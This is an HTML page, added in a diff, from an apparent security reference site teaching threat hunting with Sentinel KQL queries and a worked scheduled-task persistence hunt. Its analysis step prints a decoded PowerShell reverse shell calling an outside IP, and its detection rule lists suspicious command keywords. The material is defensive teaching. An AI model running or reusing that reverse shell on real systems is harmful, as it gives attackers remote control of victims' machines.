@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Threat Hunting | SecArch Reference</title>
+  <meta name="description" content="Comprehensive guide to Threat Hunting - hypothesis-driven hunting, KQL queries, and proactive threat detection techniques.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="main.css">
+</head>
+<body>
+  <header class="header">
+    <div class="header-content">
+      <a href="index.html" class="logo">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        </div>
+        <span>SecArch Reference</span>
+      </a>
+      <div class="search-container">
+        <div class="search-box">
+          <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          <input type="text" id="search-input" class="search-input" placeholder="Search documentation...">
+          <span class="search-shortcut">⌘K</span>
+          <div id="search-results" class="search-results"></div>
+        </div>
+      </div>
+      <button class="mobile-menu-btn" aria-label="Toggle menu">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <div class="app-container">
+    <nav class="sidebar">
+      <div class="sidebar-section">
+        <div class="sidebar-section-title">Getting Started</div>
+        <ul class="sidebar-nav">
+          <li class="sidebar-nav-item"><a href="index.html" class="sidebar-nav-link">Overview</a></li>
+        </ul>
+      </div>
+      <div class="sidebar-section">
+        <div class="sidebar-section-title">7. Security Operations</div>
+        <ul class="sidebar-nav">
+          <li class="sidebar-nav-item"><a href="siem.html" class="sidebar-nav-link">SIEM</a></li>
+          <li class="sidebar-nav-item"><a href="soar.html" class="sidebar-nav-link">SOAR</a></li>
+          <li class="sidebar-nav-item"><a href="incident-response.html" class="sidebar-nav-link">Incident Response</a></li>
+          <li class="sidebar-nav-item"><a href="threat-hunting.html" class="sidebar-nav-link active">Threat Hunting</a></li>
+          <li class="sidebar-nav-item"><a href="threat-intel.html" class="sidebar-nav-link">Threat Intelligence</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <main class="main-content">
+      <div class="content-wrapper">
+        <div class="page-header">
+          <div class="page-breadcrumb">
+            <a href="index.html">Home</a>
+            <span class="page-breadcrumb-separator">/</span>
+            <span>Security Operations</span>
+            <span class="page-breadcrumb-separator">/</span>
+            <span>Threat Hunting</span>
+          </div>
+          <h1>Threat Hunting</h1>
+          <p class="page-description">Threat hunting is the proactive, hypothesis-driven search for threats that have evaded existing detection mechanisms. Unlike alert-driven SOC work, hunting assumes the adversary is already present and seeks to find them before they achieve their objectives.</p>
+        </div>
+
+        <section>
+          <h2 id="comparison">Reactive Detection vs. Proactive Hunting</h2>
+          
+          <div class="comparison-split">
+            <div class="comparison-box traditional">
+              <div class="comparison-box-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
+                Reactive: Alert-Driven SOC
+              </div>
+              <div class="comparison-box-content">
+                <ul>
+                  <li>Wait for SIEM/EDR to alert</li>
+                  <li>Investigate known-bad signatures</li>
+                  <li>Respond to what tools detect</li>
+                  <li>Dependent on detection rules existing</li>
+                  <li>Miss novel/custom attacks</li>
+                  <li>Adversary sets the timeline</li>
+                </ul>
+                <div class="info-box danger" style="margin-top: var(--space-md);">
+                  <div class="info-box-content">
+                    <p style="margin: 0;"><strong>Gap:</strong> APT uses custom tooling with no signatures. Dwell time: 200+ days before detection.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="comparison-box modern">
+              <div class="comparison-box-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                Proactive: Threat Hunting
+              </div>
+              <div class="comparison-box-content">
+                <ul>
+                  <li>Assume breach, seek evidence</li>
+                  <li>Hunt based on TTPs, not signatures</li>
+                  <li>Query data for anomalies</li>
+                  <li>Find threats without existing alerts</li>
+                  <li>Discover novel attack patterns</li>
+                  <li>Hunter sets the timeline</li>
+                </ul>
+                <div class="info-box success" style="margin-top: var(--space-md);">
+                  <div class="info-box-content">
+                    <p style="margin: 0;"><strong>Benefit:</strong> Hunter queries for rare parent-child process relationships → finds APT's custom loader before data exfil.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="process">The Hunting Process</h2>
+          
+          <div class="diagram-container">
+            <svg viewBox="0 0 850 180" xmlns="http://www.w3.org/2000/svg">
+              <rect width="850" height="180" fill="#0f1117"/>
+              
+              <!-- Hypothesis -->
+              <rect x="30" y="40" width="150" height="100" rx="8" fill="rgba(59, 130, 246, 0.1)" stroke="#3b82f6"/>
+              <text x="105" y="75" text-anchor="middle" fill="#3b82f6" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">1. HYPOTHESIS</text>
+              <text x="105" y="95" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">"Attacker using</text>
+              <text x="105" y="108" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">living-off-the-land</text>
+              <text x="105" y="121" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">binaries for persistence"</text>
+              
+              <!-- Data Collection -->
+              <rect x="200" y="40" width="150" height="100" rx="8" fill="rgba(139, 92, 246, 0.1)" stroke="#8b5cf6"/>
+              <text x="275" y="75" text-anchor="middle" fill="#8b5cf6" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">2. DATA</text>
+              <text x="275" y="95" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Identify data sources</text>
+              <text x="275" y="108" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">EDR, SIEM, Proxy,</text>
+              <text x="275" y="121" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">AD logs, DNS</text>
+              
+              <!-- Investigation -->
+              <rect x="370" y="40" width="150" height="100" rx="8" fill="rgba(245, 158, 11, 0.1)" stroke="#f59e0b"/>
+              <text x="445" y="75" text-anchor="middle" fill="#f59e0b" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">3. INVESTIGATE</text>
+              <text x="445" y="95" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Query & analyze</text>
+              <text x="445" y="108" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Look for anomalies</text>
+              <text x="445" y="121" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Pivot on findings</text>
+              
+              <!-- Findings -->
+              <rect x="540" y="40" width="150" height="100" rx="8" fill="rgba(16, 185, 129, 0.1)" stroke="#10b981"/>
+              <text x="615" y="75" text-anchor="middle" fill="#10b981" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">4. FINDINGS</text>
+              <text x="615" y="95" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Document results</text>
+              <text x="615" y="108" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">True positive → IR</text>
+              <text x="615" y="121" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">False positive → Tune</text>
+              
+              <!-- Improve -->
+              <rect x="710" y="40" width="110" height="100" rx="8" fill="rgba(6, 182, 212, 0.1)" stroke="#06b6d4"/>
+              <text x="765" y="75" text-anchor="middle" fill="#06b6d4" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">5. IMPROVE</text>
+              <text x="765" y="95" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Create detection</text>
+              <text x="765" y="108" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">rule from hunt</text>
+              <text x="765" y="121" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">→ Automated alert</text>
+              
+              <!-- Arrows -->
+              <path d="M180 90 L200 90" stroke="#64748b" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+              <path d="M350 90 L370 90" stroke="#64748b" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+              <path d="M520 90 L540 90" stroke="#64748b" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+              <path d="M690 90 L710 90" stroke="#64748b" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+              
+              <defs>
+                <marker id="arrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+                  <polygon points="0 0, 10 3.5, 0 7" fill="#64748b"/>
+                </marker>
+              </defs>
+            </svg>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="hunt-example">Hunt Example: Living-off-the-Land Persistence</h2>
+          
+          <div class="flow-diagram">
+            <div class="flow-diagram-title">Hypothesis: Attacker using scheduled tasks for persistence (T1053.005)</div>
+            
+            <div class="flow-vertical">
+              <div class="flow-vertical-step">
+                <div class="flow-step-number">1</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Form Hypothesis</div>
+                  <div class="flow-step-description">Based on threat intel, APT groups are using scheduled tasks for persistence</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Hypothesis</span></div>
+                    <pre><code>Threat Actor: APT29 (Cozy Bear)
+Technique: T1053.005 - Scheduled Task/Job
+Behavior: Create scheduled tasks that execute malicious
+          payloads at system startup or on schedule
+
+Hypothesis: "If APT29 has compromised our environment, 
+they may have created scheduled tasks on domain-joined
+systems to maintain persistence. I will hunt for 
+suspicious scheduled task creations in the last 30 days."
+
+Data Required:
+  - Windows Security Event 4698 (scheduled task created)
+  - Sysmon Event 1 (process creation)
+  - EDR telemetry (schtasks.exe usage)</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step">
+                <div class="flow-step-number">2</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Query: Find All Scheduled Task Creations</div>
+                  <div class="flow-step-description">Baseline query to understand normal volume</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">KQL - Microsoft Sentinel</span></div>
+                    <pre><code>// Baseline: All scheduled task creations (Event 4698)
+SecurityEvent
+| where TimeGenerated > ago(30d)
+| where EventID == 4698
+| extend TaskName = tostring(EventData.TaskName)
+| extend TaskContent = tostring(EventData.TaskContent)
+| summarize 
+    Count = count(),
+    Hosts = dcount(Computer)
+    by TaskName
+| order by Count desc
+
+// Results:
+// GoogleUpdate         | 847  | 423 hosts  (normal)
+// MicrosoftEdgeUpdate  | 523  | 412 hosts  (normal)
+// OneDriveStandalone   | 234  | 234 hosts  (normal)
+// WindowsDefender      | 189  | 189 hosts  (normal)
+// SysHealthCheck       | 3    | 1 host     (⚠️ suspicious)
+// WinUpdate32          | 1    | 1 host     (⚠️ suspicious)</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step warning">
+                <div class="flow-step-number">3</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Pivot: Investigate Suspicious Tasks</div>
+                  <div class="flow-step-description">Drill into low-count, unknown scheduled tasks</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">KQL - Deep Dive</span></div>
+                    <pre><code>// Investigate suspicious scheduled tasks
+SecurityEvent
+| where TimeGenerated > ago(30d)
+| where EventID == 4698
+| extend TaskName = tostring(EventData.TaskName)
+| extend TaskContent = tostring(EventData.TaskContent)
+| where TaskName in ("SysHealthCheck", "WinUpdate32")
+| project 
+    TimeGenerated,
+    Computer,
+    Account,
+    TaskName,
+    TaskContent
+
+// Results:
+┌─────────────────────┬──────────────┬─────────────────┬──────────────────┐
+│ TimeGenerated       │ Computer     │ Account         │ TaskName         │
+├─────────────────────┼──────────────┼─────────────────┼──────────────────┤
+│ 2024-01-10 03:47:22 │ WKS-ADMIN01  │ CONTOSO\jsmith  │ SysHealthCheck   │
+│ 2024-01-08 02:15:43 │ FILESRV02    │ CONTOSO\admin   │ WinUpdate32      │
+└─────────────────────┴──────────────┴─────────────────┴──────────────────┘
+
+// Task Content Analysis (SysHealthCheck):
+// Action: powershell.exe -enc JABzAD0ATgBlAHcALQBP...
+// ⚠️ RED FLAG: Encoded PowerShell command
+// ⚠️ Created at 3:47 AM (off-hours)
+// ⚠️ Created by user account, not SYSTEM</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step danger">
+                <div class="flow-step-number">4</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Finding: Malicious Persistence Confirmed</div>
+                  <div class="flow-step-description">Decode the PowerShell, correlate with other events</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Analysis</span></div>
+                    <pre><code>// Decoded PowerShell from scheduled task:
+$s = New-Object Net.Sockets.TCPClient("185.234.72.19",443);
+$stream = $s.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    ...
+}
+
+⚠️ CONFIRMED: Cobalt Strike beacon / reverse shell
+
+Correlation - Process Tree on WKS-ADMIN01:
+  svchost.exe (scheduled task service)
+    └── powershell.exe -enc JABzAD0ATgBlAHcALQBP...
+          └── Network connection to 185.234.72.19:443
+          
+Timeline:
+  2024-01-08 02:15 - Initial access (phishing)
+  2024-01-10 03:47 - Persistence established
+  2024-01-10 03:48 - C2 callback initiated
+  (Hunt date: 2024-01-15 - 5 day dwell time detected)
+
+FINDING: TRUE POSITIVE - Active compromise
+ACTION: Escalate to IR immediately</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step success">
+                <div class="flow-step-number">5</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Improve: Create Detection Rule</div>
+                  <div class="flow-step-description">Convert hunt query into automated detection</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">New Detection Rule</span></div>
+                    <pre><code>// Analytic Rule: Suspicious Scheduled Task Creation
+// Severity: High
+// MITRE: T1053.005
+
+SecurityEvent
+| where EventID == 4698
+| extend TaskContent = tostring(EventData.TaskContent)
+| where TaskContent has_any (
+    "powershell",
+    "-enc",
+    "-encodedcommand",
+    "cmd.exe /c",
+    "mshta",
+    "wscript",
+    "cscript",
+    "regsvr32"
+)
+| where TaskContent !has "Microsoft"  // Exclude legit
+| where TaskContent !has "Google"
+| project TimeGenerated, Computer, Account, TaskName, TaskContent
+
+// Rule triggers:
+// - Alert when scheduled task contains suspicious commands
+// - Previously would have been missed
+// - Hunt converted to automated detection ✓</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="hypothesis-library">Common Hunt Hypotheses</h2>
+          
+          <div class="table-container">
+            <table>
+              <thead>
+                <tr>
+                  <th>MITRE Technique</th>
+                  <th>Hypothesis</th>
+                  <th>Data Sources</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>T1059.001</strong></td>
+                  <td>PowerShell used for encoded command execution</td>
+                  <td>Process creation, Script Block Logging</td>
+                </tr>
+                <tr>
+                  <td><strong>T1003.001</strong></td>
+                  <td>LSASS accessed for credential dumping</td>
+                  <td>Sysmon Event 10, EDR memory access</td>
+                </tr>
+                <tr>
+                  <td><strong>T1021.002</strong></td>
+                  <td>SMB used for lateral movement</td>
+                  <td>Network flows, Windows Security logs</td>
+                </tr>
+                <tr>
+                  <td><strong>T1071.001</strong></td>
+                  <td>HTTP/S used for C2 with beaconing pattern</td>
+                  <td>Proxy logs, DNS, Netflow</td>
+                </tr>
+                <tr>
+                  <td><strong>T1087.002</strong></td>
+                  <td>Domain account enumeration via net.exe</td>
+                  <td>Process creation, command line</td>
+                </tr>
+                <tr>
+                  <td><strong>T1055</strong></td>
+                  <td>Process injection into legitimate processes</td>
+                  <td>Sysmon Event 8, EDR telemetry</td>
+                </tr>
+                <tr>
+                  <td><strong>T1560.001</strong></td>
+                  <td>Data staged using archive utilities before exfil</td>
+                  <td>Process creation (7z, rar, zip)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="best-practices">Threat Hunting Best Practices</h2>
+          
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+              Hunting Success Factors
+            </div>
+            <div class="info-box-content">
+              <p><strong>1. Start with a Hypothesis:</strong> Random queries aren't hunting. Start with "If attacker did X, I would see Y in data Z."</p>
+              <p><strong>2. Use MITRE ATT&CK:</strong> Structure hunts around techniques. Cover one technique thoroughly before moving on.</p>
+              <p><strong>3. Know Your Baseline:</strong> You can't find anomalies if you don't know what's normal. Profile your environment first.</p>
+              <p><strong>4. Document Everything:</strong> Even negative results are valuable. Document queries, findings, and recommendations.</p>
+              <p><strong>5. Convert Hunts to Detections:</strong> Every successful hunt should produce an automated detection rule.</p>
+              <p><strong>6. Schedule Regular Hunts:</strong> Dedicate time weekly for hunting. It's not something to do "when you have time."</p>
+            </div>
+          </div>
+        </section>
+
+        <nav class="page-nav">
+          <a href="incident-response.html" class="page-nav-link prev">
+            <div class="page-nav-label">Previous</div>
+            <div class="page-nav-title">← Incident Response</div>
+          </a>
+          <a href="threat-intel.html" class="page-nav-link next">
+            <div class="page-nav-label">Next</div>
+            <div class="page-nav-title">Threat Intelligence →</div>
+          </a>
+        </nav>
+      </div>
+    </main>
+  </div>
+  <script src="main.js"></script>
+</body>
+</html>
